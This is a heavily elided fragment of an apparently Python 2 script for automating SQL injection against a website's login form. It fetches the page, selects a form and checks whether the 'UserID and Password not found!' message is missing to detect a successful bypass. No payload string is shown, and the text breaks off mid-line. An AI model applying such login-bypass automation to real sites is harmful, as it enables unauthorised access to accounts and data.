...
#
# I found a SQL Injection Vuln on the "LogIn / Register" Link. That's what
# I will try to automate (SQL injection on forms).
...
def sqlinj_attack_login(url):
  ...
  if response.code != 200:
    print 'Web Page could not be retrieved from %s. Verify your URL' %(url)
    exit

  print '===== Link(s) found in Document: ====='
  ...
  # I select the 2nd form (I know the name field is on the second
  # form (know from manually analyzung the HTML
  ...
  # Reading the response. If the SQLi attack was succesful we will get
  # the "Welcome" text in the HTML body
  ...
  if str_html.find("UserID and Password not found!") < 0:
    print '++[The string: "UserID and Password not found!" was not foun in' +\
